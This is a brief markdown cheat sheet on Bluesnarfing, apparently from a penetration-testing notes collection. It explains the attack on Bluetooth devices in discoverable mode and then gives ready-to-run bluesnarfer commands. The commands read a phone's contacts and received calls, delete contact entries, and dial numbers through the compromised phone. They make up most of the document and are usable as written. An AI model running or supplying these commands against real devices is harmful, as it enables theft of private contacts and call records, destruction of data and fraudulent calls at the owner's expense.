# Bluesnarfing

## Notes

Bluesnarfing is the process of exploiting vulnerabilities found in certain Bluetooth firmware in order to 
steal information from a wireless device. Successful attacks are capable of stealing contacts, calendar info, 
e-mail, and text messages when the Bluetooth device is turned on and set to discoverable mode.

## Examples

Read the first 50 entries from the phone book on a phone:

    # bluesnarfer -r 1-50 -b <MAC address of phone>

The first 10 received calls on a phone:

    # bluesnarfer -s RC -r 1-10 -b <MAC address of phone>

Delete the first 10 entries in the contacts list:

    # bluesnarfer -w 1-10 -b <MAC address of phone>

Call a phone number through the compromised phone:

    # bluesnarfer -c 'ATDT:<phone number>;' -b <MAC address of phone>

## Tools

* [Bluesnarfer](https://www.kali.org/tools/bluesnarfer/)
